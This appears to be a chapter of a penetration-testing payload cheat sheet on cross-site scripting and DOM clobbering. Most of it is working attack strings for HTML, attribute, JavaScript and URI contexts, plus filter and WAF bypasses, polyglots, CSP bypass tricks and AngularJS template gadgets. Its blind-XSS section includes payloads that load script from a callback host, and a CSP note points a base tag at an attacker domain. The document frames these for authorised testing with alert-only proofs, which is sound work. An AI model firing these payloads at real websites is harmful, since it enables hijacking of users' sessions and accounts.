# Ch01 — Cross-Site Scripting (XSS) & DOM Clobbering

> **Live-program ceiling:** prove with `alert(document.domain)` on your own session — cookie-exfil/beef/persistence payloads are lab material; report the sink + context, never deliver to victims.

> Payload families for HTML/attribute/JS/URI contexts, filter bypasses, polyglots, CSP bypass, Angular CSTI, blind XSS.
> Sources: `XSS Injection/` (README, filter bypass, polyglot, WAF bypass, CSP bypass, Angular), `DOM Clobbering/`.

**Route here when**: input is reflected in a page (reflected), persisted and replayed (stored), or reaches a JS sink (DOM-based); HTML injection is possible; CSP is deployed; a JS framework evaluates templates client-side.

**Safety**: prove with `alert(document.domain)` or `print()` — harmless, inert. Never steal real session data; use your own test account/callback.

## Detection first

Confirm reflection and identify the output context before choosing a payload:

```ps1
patt'"><>/${{7*7}}
```

Then view-source: is the value inside an HTML body, an attribute (quoted/unquoted), a JS string, a URL parameter, a `<script>`/`<style>` block, or a comment? Each context has its own family below.

## HTML body context

Baseline tags — use when nothing is filtered:

```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg/onload=alert('XSS')>
```

When a tag blacklist strips `script`:

```javascript
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<img src=x oneonerrorrror=alert(1)>     // keyword stripped once → re-forms
```

HTML5/auto-trigger tags — use when you need no user interaction:

```javascript
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
```

Pointer events on `<div>` (needs user interaction — good for stored bugs in clickable areas):

```javascript
<div onpointerover="alert(1)">MOVE HERE</div>
<div onpointerdown="alert(1)">MOVE HERE</div>
```

**Signal**: dialog fires / `document.domain` printed. If the tag survives but doesn't fire, check CSP (below).

## Attribute context

Input lands inside `value="..."` or `href="..."`:

```javascript
" onmouseover=alert(1) x="            // close attr, add handler
"><script>alert(1)</script>            // close attr + tag
" autofocus onfocus=alert(1) x="       // no interaction needed
```

Hidden input (normally dead):

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
// trigger: CTRL+SHIFT+X (Firefox/older Chrome)
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
// newer Chrome/Firefox auto-fires
```

`href` attribute → URI wrappers (see below). `srcdoc`/`srcset`/`formaction`/`data` attributes accept URL or HTML — try `formaction=javascript:alert(1)` on `<button>`/`<isindex>`.

## JavaScript-string context

Input lands inside `var x = 'INPUT';` or an event handler. Quote-prefixed breakouts:

```javascript
';alert(1);//
";alert(1);//
-confirm(1)//
</script><script>alert(1)</script>     // escape the <script> block itself
```

Without quotes available (numeric/template context): `; alert(1);//`, or template literal `` `${alert(1)}` ``.

## URI / `javascript:` wrapper context

Sink is `location=`, `href=`, `window.open`, `iframe src`, `<a href>`:

```javascript
javascript:alert(1)
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
```

"javascript" blacklisted → encode or split the scheme:

```javascript
java%0ascript:alert(1)     // LF inside scheme
java%09script:alert(1)     // TAB inside scheme
java%0dscript:alert(1)     // CR inside scheme
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)     // backslash escapes (in JS string contexts)
```

`vbscript:msgbox("XSS")` — legacy IE only.

## DOM-based XSS

Source→sink analysis (URL fragment, postMessage, localStorage, `location.hash`):

```javascript
#"><img src=/ onerror=alert(2)>
```

Common sinks: `innerHTML`, `document.write`, `eval`, `location`/`location.href`, `$(...)`, `element.src`. Sources: `location.hash`, `location.search`, `document.referrer`, `postMessage` payloads.

**postMessage**: target page does `window.addEventListener('message', e => sink(e.data))` without origin check → send `postMessage` from a controlled iframe.

## DOM clobbering

When you can inject HTML (not JS), clobber globals the app reads:

```html
<img name=x><img name=y>            <!-- window.x / window.y become elements -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:...">
<form id=x name=y><input name=z></form>
```

Use when: sanitizer allows `<a>`/`<img>`/`form` but blocks scripts; the app reads `window.*` or named element properties (e.g., `config.x`, `defaultAvatar.src`). Chains into XSS when a clobbered attribute feeds a sink (`<a id=tag name=attr href=javascript:...>`).

## Polyglots (unknown / mixed contexts)

Use when you don't know the sink or the input traverses several contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

## Filter-bypass toolkit

**Case / keyword filters**

```javascript
<ScRiPt>alert(1)</sCrIpT>
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

**Quotes/parens filtered**

```javascript
<script>alert`1`</script>
<svg onload=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>      // &lpar; &rpar; entity parens
<img id=alert(1) onerror=eval(id)>           // payload smuggled in another attribute
Set.constructor`al\x65rt\x2814\x29```       // tagged-template eval
onerror=eval;throw'=alert\x28\x29\x3b\x61lert\x281\x29'
```

**Space filtered**

```javascript
<svg/onload=alert(1)>        // / as separator
<svg	onload=alert(1)>          // TAB (0x09) as separator
<img/src=x/onerror=alert(1)>
{onload=alert(1)}            // inside JS-ish contexts
```

**`.`/`document`/`cookie` blacklisted**

```javascript
alert(document['domain'])
alert(document[/domain/.source])
alert(self['document']['domain'])
with(document)alert(domain)
alert(top[/doc/.source+/ument/.source].domain)
```

**`>` filtered**: `<svg onload=alert(1)//` — leave the tag unclosed; the parser still runs it at EOF/next tag.

**Alert keyword filtered**: `prompt(1)`, `confirm(1)`, `print()`, `eval(atob('...'))`, `Function('al'+'ert(1)')()`, `` top[/al/.source+/ert/.source](1) ``.

**Charsets / unicode mutations** — when the filter normalizes:

```javascript
＜script＞alert(1)＜/script＞        // fullwidth < > (U+FF1C/U+FF1E)
<ıţŕŕ ƈșv>                          // rare scripts that fold to ASCII
<script>eval('\x61lert(\'33\')')</script>
```

**Incomplete-tag tricks**: `<img src="x>` (unterminated attr swallows following markup), nested comments `--!>` vs `-->`.

## Blind XSS

For admin panels, feedback forms, logs — anywhere the output is viewed by someone else later. Inject a callback loader instead of an alert:

```javascript
"><script src=https://YOUR-CALLBACK/x.js></script>
'"><script src=data:,eval(atob(location.hash.slice(1)))>
```

Variants to plant everywhere input may resurface (email subjects, user-agent, filenames, JSON fields). Signal: a request hits your listener — proves execution context and which page rendered it. Only use endpoints you control.

## CSP bypass notes

When the tag survives but CSP blocks execution:

- `script-src 'self'` + JSONP endpoint on same origin → `<script src="/jsonp?callback=alert(1)//">`.
- Whitelisted CDN/Angular origin → host an Angular CSTI gadget there.
- `strict-dynamic` → look for existing trusted script gadgets that reach `eval`/`innerHTML`.
- Missing `base-uri` → `<base href="//attacker.tld/">` then relative `<script src=x>` resolves off-origin.
- `unsafe-inline` present → inline event handlers work; just use `<svg onload=...>`.

## Angular / client-side template injection (CSTI)

AngularJS 1.x sandbox-era gadgets still fire inside `ng-app` scopes:

```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
{{7*7}}                             // detection: renders 49
```

Detection: if `{{7*7}}` renders `49`, an expression engine evaluates your input — try the CSTI gadget for the detected version. (Server-side `{{7*7}}` = SSTI → ch04.)

## File-based XSS (SVG/XML/mathml uploads and inline render)

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><script>alert(1)</script></svg>
<svg><a><rect width=100% height=100% /><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></mglyph></style></table></mtext></math>
```

Short SVG: `<svg/onload=alert(1)>`. Use for upload endpoints that render files inline (same-origin!) and for XML ingestors → also check ch09 for upload tricks and ch06 for XXE inside SVG.
